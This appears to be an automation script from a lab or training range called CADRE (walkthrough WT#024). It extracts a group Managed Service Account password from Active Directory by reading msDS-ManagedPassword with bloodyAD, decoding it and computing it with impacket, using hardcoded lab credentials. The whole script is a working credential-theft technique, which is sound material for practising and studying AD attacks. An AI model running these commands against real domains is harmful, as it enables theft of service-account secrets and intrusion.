#!/bin/bash
# CADRE — WT#024 gMSA Extraction
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#024 — gMSA Extraction"
start_attack "024" "gMSA Extraction"

require_tool bloodyAD
require_env DC01 "DC01"
require_env DOMAIN_ROOT "DOMAIN_ROOT"

step "Step 1: Extract gMSA msDS-ManagedPassword attribute"
run_cmd "bloodyAD --host \"$DC01\" -d \"$DOMAIN_ROOT\" -u eng_cloud -p 'Cl0ud_Eng!' get object 'gmsaTools\$' --attr msDS-ManagedPassword"

step "Step 2: Decode the managed password blob"
run_cmd "bloodyAD --host \"$DC01\" -d \"$DOMAIN_ROOT\" -u eng_cloud -p 'Cl0ud_Eng!' get object 'gmsaTools\$' --attr msDS-ManagedPassword 2>&1 | grep -oP 'msDS-ManagedPassword: \K.*' | base64 -d > gmsa_blob.bin"

step "Step 3: Use impacket to compute gMSA password"
run_cmd "impacket-gmsadump -dc-ip $DC01 \"$DOMAIN_ROOT/eng_cloud:'Cl0ud_Eng!'\" gmsaTools\$"

result $? "gMSA extraction completed"
